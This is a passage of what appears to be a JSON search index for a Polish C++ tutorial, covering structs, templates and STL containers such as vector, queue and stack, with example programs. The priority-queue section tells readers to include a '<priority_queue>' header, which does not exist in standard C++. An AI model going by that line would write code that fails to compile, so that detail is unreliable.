warto\u015bci.</p>"},{"location":"programming/c%2B%2B/introduction/oop/structures/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\n// Structure containing three variables of type double and one method\n/// Structure representing 3d point\nstruct Point3D {\n    double x;\n    double y;\n    double z;\n\n    // Custom method (function) assigned to Point3D type\n    /// Prints out description of the Point3D\n    void describe() {\n        cout &lt;&lt; \"x = \" &lt;&lt; x &lt;&lt; \", \";\n        cout &lt;&lt; \"y = \" &lt;&lt; y &lt;&lt; \", \";\n        cout &lt;&lt; \"z = \" &lt;&lt; z &lt;&lt; endl;\n    }\n};\n\nint main() {\n    Point3D point3D = {5.7, 2.3, 9.0};\n\n    // Our Point3D structure have one method (function): describe\n    // To use it we write: variable_name.method_name\n    cout &lt;&lt; endl &lt;&lt; \"Calling method describe for point3D\" &lt;&lt; endl;\n    point3D.describe();\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/structures/#przykad-3-prostokat","title":"Przyk\u0142ad 3: prostok\u0105t","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\n/// Structure representing the rectangle\nstruct Rectangle {\n    // By default everything in the structure is defined as public\n    // That means that it can be accessed from any context in the code\n\n    // But we can override this behaviour\n    // We can explicitly say that some fields (or methods) should be defined as private\n    // Private fields (or methods) can only be accessed from the inside of the structure\n\n    // Everything defined after the \"private\" keyword is considered as private\n    // Until we reach \"public\" keyword or the end of the structure\nprivate:\n    // Fields width and height can only be accessed in this structure\n    double width;\n    double height;\n\n    // Everything defined after the \"public\" keyword is considered as public\n    // Until we reach the \"private\" keyword or the end of the structure\npublic:\n    // This methods can be accessed from outside of this structure\n\n    // Because we defined fields as private, we now don't have the default constructor\n    // That means we cannot create new variable of type Rectangle and assign value to it using {} notation\n    // To use this default notation we must define our custom constructor\n    // Constructor is a special function that is called when we assign new beginning value to our struct variable\n    // This function doesn't have a type and shouldn't return any value\n    // It can have as many parameters as we want\n    // Constructor should assign some values to the fields of our structure\n\n    /// Constructor setting width and height of the rectangle\n    /// \\param w - width of the rectangle\n    /// \\param h - height of the rectangle\n    Rectangle(double w, double h) {\n        width = w;\n        height = h;\n    }\n\n    /// Compute area of the rectangle\n    /// \\return Area of the rectangle\n    double area() {\n        // We can use this private fields because we are still inside the structure\n        return width * height;\n    }\n\n    /// Scale rectangle by the given scale\n    /// \\param sc - scale by which the rectangle should be scaled\n    void scale(double sc) {\n        width *= sc;\n        height *= sc;\n    }\n};\n\nint main() {\n    Rectangle rectangle = {4, 2};\n\n    // We cannot access width of this rectangle, because this field is defined as private\n    // cout &lt;&lt; \"Rectangle width: \" &lt;&lt; rectangle.width &lt;&lt; endl;\n\n    // We can use method area of the rectangle, because it is defined as public\n    cout &lt;&lt; \"Rectangle area: \" &lt;&lt; rectangle.area() &lt;&lt; endl;\n\n    cout &lt;&lt; \"Scale rectangle by 5\" &lt;&lt; endl;\n    rectangle.scale(5);\n    cout &lt;&lt; \"Rectangle area after scaling: \" &lt;&lt; rectangle.area() &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/templates/","title":"Szablony","text":""},{"location":"programming/c%2B%2B/introduction/oop/templates/#wstep","title":"Wst\u0119p","text":"<p>Szablony pozwalaj\u0105 pisa\u0107 kod, kt\u00f3ry jest niezale\u017cny od konkretnego typu. Normalnie, jak tworzymy funkcj\u0119, to musimy ustali\u0107 typ jej parametr\u00f3w i typ zwracanej warto\u015bci. Cz\u0119sto jednak jest tak, \u017ce chcieliby\u015bmy, \u017ceby funkcja dzia\u0142a\u0142a na r\u00f3\u017cnych typach. Dla przyk\u0142adu rozwa\u017cmy dodawanie do siebie dw\u00f3ch liczb. Implementacja cia\u0142a takiej funkcji b\u0119dzie wygl\u0105da\u0142a tak samo, bez wzgl\u0119du na to, czy parametry b\u0119d\u0105 typu <code>int</code>, <code>double</code>, <code>float</code>, czy te\u017c innego typu liczbowego. R\u00f3\u017cnica b\u0119dzie tkwi\u0107 jedynie w typach parametr\u00f3w i typie zwracanej warto\u015bci. W takim przypadku mo\u017cemy skorzysta\u0107 z szablon\u00f3w, zamiast pisa\u0107 wiele podobnych funkcji. Z szablon\u00f3w mo\u017cemy korzysta\u0107 tak\u017ce przy tworzeniu klas.</p>"},{"location":"programming/c%2B%2B/introduction/oop/templates/#szablony-funkcji","title":"Szablony funkcji","text":"<p>Tworzenie szablonu funkcji jest stosunkowo proste. Wystarczy skorzysta\u0107 ze s\u0142owa kluczowego <code>template</code>, a nast\u0119pnie zdefiniowa\u0107 w\u0142asn\u0105 nazw\u0119 typu szablonu <code>typename</code> lub <code>class</code>. Zar\u00f3wno <code>typename</code> jak i <code>class</code> dzia\u0142aj\u0105 tak samo. Zobaczmy jak to wygl\u0105da na poni\u017cszym przyk\u0142adzie.</p>"},{"location":"programming/c%2B%2B/introduction/oop/templates/#przykad","title":"Przyk\u0142ad","text":"<p>Napiszemy szablon funkcji dodaj\u0105cej do siebie dwie warto\u015bci.</p>"},{"location":"programming/c%2B%2B/introduction/oop/templates/#funkcja","title":"Funkcja","text":"<pre><code>template &lt;typename T&gt;\nT sum(T a, T b) {\n  return a + b;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/templates/#wywoanie","title":"Wywo\u0142anie","text":"<pre><code>double d1 = 9.3, d2 = 1.2;\nfloat f1 = 54.3, f2 = 3.6;\nint i1 = 1, i2 = 2;\n\ncout &lt;&lt; sum(d1, d2) &lt;&lt; endl;\ncout &lt;&lt; sum(f1, f2) &lt;&lt; endl;\ncout &lt;&lt; sum(i1, i2) &lt;&lt; endl;\n</code></pre> <p>Aby si\u0119 upewni\u0107, \u017ce typy zwracanych warto\u015bci s\u0105 prawid\u0142owe, mo\u017cemy skorzysta\u0107 z operatora <code>typeid</code> z biblioteki <code>typeinfo</code>:</p> <pre><code>cout &lt;&lt; typeid(sum(d1, d2)).name() &lt;&lt; endl;\ncout &lt;&lt; typeid(sum(f1, f2)).name() &lt;&lt; endl;\ncout &lt;&lt; typeid(sum(i1, i2)).name() &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/oop/templates/#link-do-implementacji","title":"Link do implementacji","text":"<p>Szablon funkcji</p>"},{"location":"programming/c%2B%2B/introduction/oop/templates/#szablony-klas","title":"Szablony klas","text":"<p>Szablony klas wygl\u0105daj\u0105 podobnie do szablon\u00f3w funkcji.</p>"},{"location":"programming/c%2B%2B/introduction/oop/templates/#przykad_1","title":"Przyk\u0142ad","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\ntemplate &lt;class T&gt;\nclass Point2D {\n  T x, y;\n\n  public:\n    Point2D() {\n      this-&gt;x = 0;\n      this-&gt;y = 0;\n    }\n\n    Point2D(T x, T y) {\n      this-&gt;x = x;\n      this-&gt;y = y;\n    }\n\n    T getX() {\n      return this-&gt;x;\n    }\n\n    void setX(T val) {\n      this-&gt; x = val;\n    }\n\n    T getY() {\n      return this-&gt;y;\n    }\n\n    void setY(T val) {\n      this-&gt;y = val;\n    }\n\n    void translate(Point2D translation) {\n      this-&gt;x += translation.x;\n      this-&gt;y += translation.y;\n    }\n\n    void rotate(T angle) {\n      T newX = this-&gt;x * cos(angle) - this-&gt;y * sin(angle);\n      T newY = this-&gt;x * sin(angle) + this-&gt;y * cos(angle);\n      this-&gt;x = newX;\n      this-&gt;y = newY;\n    }\n\n    void scale(T sc) {\n      this-&gt;x *= sc;\n      this-&gt;y *= sc;\n    }\n\n    void print() {\n      cout &lt;&lt; \"(\" &lt;&lt; this-&gt;x &lt;&lt; \", \" &lt;&lt; this-&gt;y &lt;&lt; \")\" &lt;&lt; endl;\n    }\n};\n\nint main() {\n  Point2D&lt;int&gt; pointInt = Point2D&lt;int&gt;(2, 5);\n  Point2D&lt;double&gt; pointDouble = Point2D&lt;double&gt;(4.5, 1.3);\n\n  pointInt.print();\n\n  pointDouble.print();\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/","title":"STL","text":"<p>STL: Standard Template Library</p> <p>Pot\u0119\u017cny zestaw narz\u0119dzi dla programisty. Nie jest to mo\u017ce bij\u0105ce serce j\u0119zyka C++, ale taka nerka to ju\u017c na pewno. Niby mo\u017cna si\u0119 bez tego obej\u015b\u0107, ale \u017cycie nie jest ju\u017c wtedy takie samo.</p> <p>Nie b\u0119dziemy tutaj rozwodzi\u0107 si\u0119 nad t\u0105 bibliotek\u0105 (a tak w\u0142a\u015bciwie to zestawem bibliotek) poka\u017cemy jedynie jedne z cz\u0119\u015bciej wykorzystywanych jej sk\u0142adnik\u00f3w. Po dok\u0142adny opis odsy\u0142amy do dokumentacji.</p>"},{"location":"programming/c%2B%2B/introduction/stl/#dokumentacja","title":"Dokumentacja","text":"<p>C++ STL Manual</p>"},{"location":"programming/c%2B%2B/introduction/stl/#sciaga","title":"\u015aci\u0105ga","text":"<p>C++ STL - \"\u015bci\u0105ga\"</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/","title":"Tablice dynamiczne","text":""},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#opis","title":"Opis","text":"<p>Co oznacza, \u017ce tablica jest dynamiczna? To znaczy, \u017ce w dowolnym momencie dzia\u0142ania programu mo\u017cemy zmienia\u0107 jej rozmiar, tzn. dodawa\u0107 i usuwa\u0107 elementy (w przeciwie\u0144stwie do tablic statycznych). Jest to przydatne np. w sytuacji gdy nie wiemy, ile warto\u015bci b\u0119dziemy musieli w takiej tablicy przechowa\u0107.</p> <p>W STL mamy dwie podstawowe klasy implementuj\u0105ce tablice dynamiczne: <code>vector</code> oraz <code>deque</code>. W za\u0142o\u017ceniach s\u0105 do siebie bardzo zbli\u017cone. Podstawowa r\u00f3\u017cnica jest taka, \u017ce <code>vector</code> jest jednokierunkowy, a <code>deque</code> dwukierunkowy. Co to oznacza w praktyce? Do tablic typu <code>vector</code> mo\u017cemy tanio dodawa\u0107 i usuwa\u0107 elementy od ko\u0144ca. Do <code>deque</code> mo\u017cemy natomiast dodawa\u0107 i usuwa\u0107 elementy zar\u00f3wno z ko\u0144ca jak i z pocz\u0105tku.</p> <p>W poni\u017cszych przyk\u0142adach wykorzystujemy <code>vector</code>, jednak mo\u017cna go spokojnie zast\u0105pi\u0107 klas\u0105 <code>deque</code> i wszystko b\u0119dzie dzia\u0142a\u0107 tak samo.</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#biblioteka","title":"Biblioteka","text":"<p>Do klasy <code>vector</code> potrzebujemy biblioteki <code>vector</code>, a do klasy <code>deque</code> potrzebujemy biblioteki <code>deque</code>.</p> <pre><code>#include &lt;vector&gt;\n#include &lt;deque&gt;\n\nusing namespace std;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#dokumentacja","title":"Dokumentacja","text":""},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#vector","title":"Vector","text":"<p>Vector Reference</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#deque","title":"Deque","text":"<p>Deque Reference</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#implementacja-przykady","title":"Implementacja: przyk\u0142ady","text":""},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#utworzenie-pustej-tablicy","title":"Utworzenie pustej tablicy","text":"<pre><code>vector&lt;int&gt; array;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#utworzenie-tablicy-o-zadanej-dugosci","title":"Utworzenie tablicy o zadanej d\u0142ugo\u015bci","text":"<pre><code>vector&lt;int&gt; array(10);\n</code></pre> <p>Tablica zostanie wype\u0142niona warto\u015bciami domy\u015blnymi dla danego typu, np. dla typu <code>int</code> jest to \\(0\\).</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#utworzenie-tablicy-wypenionej-zadana-wartoscia","title":"Utworzenie tablicy wype\u0142nionej zadan\u0105 warto\u015bci\u0105","text":"<pre><code>vector&lt;int&gt; array(10, -1);\n</code></pre> <p>Tablica zostanie wype\u0142niona warto\u015bciami \\(-1\\).</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#wypisanie-wybranego-elementu-tablicy","title":"Wypisanie wybranego elementu tablicy","text":"<pre><code>cout &lt;&lt; \"4-th element of the array is: \" &lt;&lt; array[3] &lt;&lt; endl;\n</code></pre> <p>Tak jak i w przypadku tablic statycznych, elementy indeksujemy od \\(0\\).</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#wypisanie-dugosci-tablicy","title":"Wypisanie d\u0142ugo\u015bci tablicy","text":"<pre><code>cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#dodanie-nowego-elementu-na-koniec-tablicy","title":"Dodanie nowego elementu na koniec tablicy","text":"<pre><code>array.push_back(55);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#dodanie-nowego-elementu-na-poczatek-tablicy-tylko-deque","title":"Dodanie nowego elementu na pocz\u0105tek tablicy (tylko deque)","text":"<pre><code>array.push_front(55);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#usuniecie-ostatniego-elementu-tablicy","title":"Usuni\u0119cie ostatniego elementu tablicy","text":"<pre><code>array.pop_back();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#usuniecie-pierwszego-elementu-tablicy-tylko-deque","title":"Usuni\u0119cie pierwszego elementu tablicy (tylko deque)","text":"<pre><code>array.pop_front();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#usuniecie-elementu-pod-zadanym-indeksem","title":"Usuni\u0119cie elementu pod zadanym indeksem","text":"<pre><code>array.erase(array.begin() + 5);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#usuniecie-fragmentu-tablicy","title":"Usuni\u0119cie fragmentu tablicy","text":"<pre><code>array.erase(array.begin() + 5, array.begin() + 7);\n</code></pre> <p>Po wykonaniu powy\u017cszej operacji zostan\u0105 usuni\u0119te elementy pod indeksami \\(5\\) oraz \\(6\\) (bez elementu na pozycji \\(7\\)).</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#zmiana-rozmiaru-tablicy","title":"Zmiana rozmiaru tablicy","text":"<pre><code>array.resize(20);\n</code></pre> <p>Je\u017celi tablica by\u0142a mniejsza, to nowe pozycje zostan\u0105 wype\u0142nione domy\u015blnymi warto\u015bciami.</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#zmiana-rozmiaru-tablicy-i-wybrana-wartosc","title":"Zmiana rozmiaru tablicy i wybrana warto\u015b\u0107","text":"<pre><code>array.resize(30, -1);\n</code></pre> <p>Je\u017celi tablica by\u0142a mniejsza, to nowe pozycje zostan\u0105 wype\u0142nione warto\u015bci\u0105 \\(-1\\).</p>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#sprawdzenie-czy-tablica-jest-pusta","title":"Sprawdzenie, czy tablica jest pusta","text":"<pre><code>if(array.empty()) {\n    cout &lt;&lt; \"Array is empty\" &lt;&lt; endl;\n} else {\n    cout &lt;&lt; \"Array is not empty\" &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#wyczyszczenie-tablicy","title":"Wyczyszczenie tablicy","text":"<pre><code>array.clear();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#wypisanie-wszystkich-elementow-tablicy","title":"Wypisanie wszystkich element\u00f3w tablicy","text":"<pre><code>for(auto el: array) {\n    cout &lt;&lt; el &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#przykadowa-implementacja","title":"Przyk\u0142adowa implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main() {\n    // Creating empty vector containing integers\n    vector&lt;int&gt; array;\n    // Creating vector containing 10 elements of type integer with default value for that type - 0\n    vector&lt;int&gt; array2(10);\n\n    cout &lt;&lt; \"Element 0 of array2 is: \" &lt;&lt; array2[0] &lt;&lt; endl;\n\n    // Creating vector containing 10 elements of type integer with value 23\n    vector&lt;int&gt; array3(10, 23);\n\n    cout &lt;&lt; \"Element 0 of array3 is: \" &lt;&lt; array3[0] &lt;&lt; endl;\n\n    // We can also achieve similar behaviour by setting value for existing variable\n    array = vector&lt;int&gt;(10, 23);\n    cout &lt;&lt; \"Element 0 of array is: \" &lt;&lt; array[0] &lt;&lt; endl;\n\n    // Checking size of the array\n    cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n\n    // Adding new element to the end of the array\n    array.push_back(55);\n    cout &lt;&lt; \"Last element of array is: \" &lt;&lt; array[array.size() - 1] &lt;&lt; endl;\n    cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n\n    // Adding new element at the position 5 in the array\n    array.insert(array.begin() + 5, 60);\n    cout &lt;&lt; \"Element 5 of array is: \" &lt;&lt; array[5] &lt;&lt; endl;\n    cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n\n    // Deleting last element in the array\n    array.pop_back();\n    cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n\n    // Deleting element at the position 5\n    array.erase(array.begin() + 5);\n    cout &lt;&lt; \"Element 5 of array is: \" &lt;&lt; array[5] &lt;&lt; endl;\n    cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n\n    // Deleting elements in the array from index 5 to 7, not including 7\n    array.erase(array.begin() + 5, array.begin() + 7);\n    cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n\n    // Resizing array to size 20, filling new elements with default value\n    array.resize(20);\n    cout &lt;&lt; \"Element 19 of the array is: \" &lt;&lt; array[19] &lt;&lt; endl;\n    cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n\n    // Resizing array to size 30, filling new elements with the value 41\n    array.resize(30, 41);\n    cout &lt;&lt; \"Element 29 of the array is: \" &lt;&lt; array[29] &lt;&lt; endl;\n    cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n\n    // Checking if the array is empty\n    if(array.empty()) {\n        cout &lt;&lt; \"Array is empty\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"Array is not empty\" &lt;&lt; endl;\n    }\n\n    cout &lt;&lt; \"Content of the array: \";\n    // Printing content of the array\n    for(auto el: array) {\n        cout &lt;&lt; el &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n\n    // Clearing array removing all of its content\n    array.clear();\n    cout &lt;&lt; \"Size of the array is: \" &lt;&lt; array.size() &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/dynamic-array/#link-do-implementacji","title":"Link do implementacji","text":"<p>vector - przyk\u0142ady</p>"},{"location":"programming/c%2B%2B/introduction/stl/lists/","title":"Listy","text":""},{"location":"programming/c%2B%2B/introduction/stl/lists/#opis","title":"Opis","text":"<p>Listy dwukierunkowe pozwalaj\u0105 na szybkie (efektywne) wykonywanie takich operacji jak: usuni\u0119cie elementu z zadanej pozycji, dodanie elementu na zadan\u0105 pozycj\u0119.</p>"},{"location":"programming/c%2B%2B/introduction/stl/lists/#biblioteka","title":"Biblioteka","text":"<p>Lista dwukierunkowa znajduje si\u0119 w bibliotece <code>list</code>.</p> <pre><code>#include &lt;list&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/lists/#dokumentacja","title":"Dokumentacja","text":"<p>List Reference</p>"},{"location":"programming/c%2B%2B/introduction/stl/map/","title":"Mapa","text":""},{"location":"programming/c%2B%2B/introduction/stl/map/#opis","title":"Opis","text":"<p>Za pomoc\u0105 mapy mo\u017cemy tworzy\u0107 pary typu (klucz, warto\u015b\u0107) i zapami\u0119tywa\u0107 je w zbiorze, w kt\u00f3rym klucze s\u0105 unikalne. W innych j\u0119zykach programowania ten typ struktury nazywany jest cz\u0119sto s\u0142ownikiem (ang. dictionary).</p>"},{"location":"programming/c%2B%2B/introduction/stl/map/#biblioteka","title":"Biblioteka","text":"<p>Mapa znajduje si\u0119 w bibliotece <code>map</code>.</p> <pre><code>#include &lt;map&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/map/#dokumentacja","title":"Dokumentacja","text":"<p>Map Reference</p>"},{"location":"programming/c%2B%2B/introduction/stl/queue/","title":"Kolejka","text":""},{"location":"programming/c%2B%2B/introduction/stl/queue/#opis","title":"Opis","text":"<p>Kolejka to jedna z klasycznych struktur danych.  Wykorzystywana jest w wielu algorytmach, nic dziwnego wi\u0119c, \u017ce jej implementacja znajduje si\u0119 tak\u017ce w STL.</p>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#biblioteka","title":"Biblioteka","text":"<p>Kolejka znajduje si\u0119 w bibliotece <code>queue</code>.</p> <pre><code>#include &lt;queue&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#dokumentacja","title":"Dokumentacja","text":"<p>Queue Reference</p>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#implementacja-przykady","title":"Implementacja: przyk\u0142ady","text":"<p>Kilka przyk\u0142ad\u00f3w pokazuj\u0105cych, jak korzysta\u0107 z klasy <code>stack</code>.</p>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#utworzenie-pustej-kolejki","title":"Utworzenie pustej kolejki","text":"<pre><code>queue&lt;int&gt; qu;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#dodanie-elementu-na-koniec-kolejki","title":"Dodanie elementu na koniec kolejki","text":"<pre><code>qu.push(5);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#pobranie-elementu-z-poczatku-kolejki","title":"Pobranie elementu z pocz\u0105tku kolejki","text":"<pre><code>int el;\n\nel = qu.front();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#usuniecie-elementu-z-poczatku-kolejki","title":"Usuni\u0119cie elementu z pocz\u0105tku kolejki","text":"<pre><code>qu.pop();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#wypisanie-rozmiaru-kolejki","title":"Wypisanie rozmiaru kolejki","text":"<pre><code>cout &lt;&lt; \"Size of the queue: \" &lt;&lt; qu.size() &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#wyczyszczenie-kolejki","title":"Wyczyszczenie kolejki","text":"<pre><code>qu = queue&lt;int&gt;();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#sprawdzenie-czy-kolejka-jest-pusta","title":"Sprawdzenie, czy kolejka jest pusta","text":"<pre><code>if (qu.empty()) {\n    cout &lt;&lt; \"Queue is empty\" &lt;&lt; endl;\n} else {\n    cout &lt;&lt; \"Queue is not empty\" &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#przykadowa-implementacja","title":"Przyk\u0142adowa implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;queue&gt;\n\nusing namespace std;\n\nint main() {\n    cout &lt;&lt; \"Create queue containing values of type int\" &lt;&lt; endl;\n    // We can create empty queue writing: queue&lt;elements_type&gt; variable_name;\n    queue&lt;int&gt; qu;\n\n    // To get current size of the queue (number of elements in it) we use \"size\" method\n    cout &lt;&lt; \"Size of the queue: \" &lt;&lt; qu.size() &lt;&lt; endl;\n\n    cout &lt;&lt; endl &lt;&lt; \"Add new elements to the end of the queue\" &lt;&lt; endl;\n    // To add new elements to the queue we use \"push\" method\n    // This places new element passed as a parameter at the end of the queue\n    qu.push(5);\n    qu.push(-50);\n    qu.push(25);\n    qu.push(120);\n\n    cout &lt;&lt; \"Size of the queue: \" &lt;&lt; qu.size() &lt;&lt; endl;\n\n    // To get value of the first element in the queue we use \"front\" method\n    // This method does not remove element from the queue\n    cout &lt;&lt; endl &lt;&lt; \"First element of the queue: \" &lt;&lt; qu.front() &lt;&lt; endl;\n    cout &lt;&lt; \"Removing top element from the queue\" &lt;&lt; endl;\n    // To remove top element of the queue (from the first position) we use \"pop\" method\n    // This method only removes the first element without returning its value\n    qu.pop();\n    cout &lt;&lt; \"First element of the queue: \" &lt;&lt; qu.front() &lt;&lt; endl;\n    cout &lt;&lt; \"Size of the queue: \" &lt;&lt; qu.size() &lt;&lt; endl;\n\n    // To get value of the last element in the queue we use \"back\" method\n    // This method does not remove element from the queue\n    cout &lt;&lt; endl &lt;&lt; \"Last element of the queue: \" &lt;&lt; qu.back() &lt;&lt; endl;\n\n    cout &lt;&lt; endl &lt;&lt; \"Clearing queue by assigning new value to it\" &lt;&lt; endl;\n    qu = queue&lt;int&gt;();\n\n    cout &lt;&lt; \"Size of the queue: \" &lt;&lt; qu.size() &lt;&lt; endl;\n\n    cout &lt;&lt; endl &lt;&lt; \"Checking if queue is empty\" &lt;&lt; endl;\n    // To check if queue is empty (its size is equal to zero) we can use \"empty\" method\n    // This method returns true if queue is empty, false otherwise\n    if (qu.empty()) {\n        cout &lt;&lt; \"Queue is empty\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"Queue is not empty\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#link-do-implementacji","title":"Link do implementacji","text":"<p>queue - przyk\u0142ady</p>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#kolejka-priorytetowa","title":"Kolejka priorytetowa","text":"<p>Poza standardow\u0105 kolejk\u0105 w STL znajdziemy tak\u017ce kolejk\u0119 priorytetow\u0105. Korzystamy z niej praktycznie tak samo jak ze zwyk\u0142ej kolejki. R\u00f3\u017cnica oczywi\u015bcie tkwi w kolejno\u015bci element\u00f3w pobieranych z kolejki, a tak\u017ce w nazwie klasy.</p>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#biblioteka_1","title":"Biblioteka","text":"<p>Aby korzysta\u0107 z kolejki priorytetowej potrzebujemy biblioteki <code>priority_queue</code>.</p> <pre><code>#include &lt;priority_queue&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/queue/#dokumentacja_1","title":"Dokumentacja","text":"<p>Priority Queue Reference</p>"},{"location":"programming/c%2B%2B/introduction/stl/set/","title":"Zbi\u00f3r","text":""},{"location":"programming/c%2B%2B/introduction/stl/set/#opis","title":"Opis","text":"<p>Do przechowywania unikalnych warto\u015bci pos\u0142u\u017cy nam zbi\u00f3r (ang. set).</p>"},{"location":"programming/c%2B%2B/introduction/stl/set/#biblioteka","title":"Biblioteka","text":"<p>Zbi\u00f3r znajduje si\u0119 w bibliotece <code>set</code>.</p> <pre><code>#include &lt;set&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/set/#dokumentacja","title":"Dokumentacja","text":"<p>Set Reference</p>"},{"location":"programming/c%2B%2B/introduction/stl/stack/","title":"Stos","text":""},{"location":"programming/c%2B%2B/introduction/stl/stack/#opis","title":"Opis","text":"<p>Stos to jedna z klasycznych struktur danych.  Wykorzystywana jest w wielu algorytmach, nic dziwnego wi\u0119c, \u017ce jej implementacja znajduje si\u0119 tak\u017ce w STL.</p>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#biblioteka","title":"Biblioteka","text":"<p>Stos znajduje si\u0119 w bibliotece <code>stack</code>.</p> <pre><code>#include &lt;stack&gt;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#dokumentacja","title":"Dokumentacja","text":"<p>Stack Reference</p>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#implementacja-przykady","title":"Implementacja: przyk\u0142ady","text":"<p>Kilka przyk\u0142ad\u00f3w pokazuj\u0105cych, jak korzysta\u0107 z klasy <code>stack</code>.</p>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#utworzenie-pustego-stosu","title":"Utworzenie pustego stosu","text":"<pre><code>stack&lt;int&gt; st;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#dodanie-elementu-na-stos","title":"Dodanie elementu na stos","text":"<pre><code>st.push(5);\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#pobranie-elementu-ze-stosu","title":"Pobranie elementu ze stosu","text":"<pre><code>int el;\n\nel = st.top();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#usuniecie-elementu-ze-stosu","title":"Usuni\u0119cie elementu ze stosu","text":"<pre><code>st.pop();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#wypisanie-rozmiaru-stosu","title":"Wypisanie rozmiaru stosu","text":"<pre><code>cout &lt;&lt; \"Size of the stack: \" &lt;&lt; st.size() &lt;&lt; endl;\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#wyczyszczenie-stosu","title":"Wyczyszczenie stosu","text":"<pre><code>st = stack&lt;int&gt;();\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#sprawdzenie-czy-stos-jest-pusty","title":"Sprawdzenie, czy stos jest pusty","text":"<pre><code>if (st.empty()) {\n    cout &lt;&lt; \"Stack is empty\" &lt;&lt; endl;\n} else {\n    cout &lt;&lt; \"Stack is not empty\" &lt;&lt; endl;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/introduction/stl/stack/#przykadowa-implementacja","title":"Przyk\u0142adowa 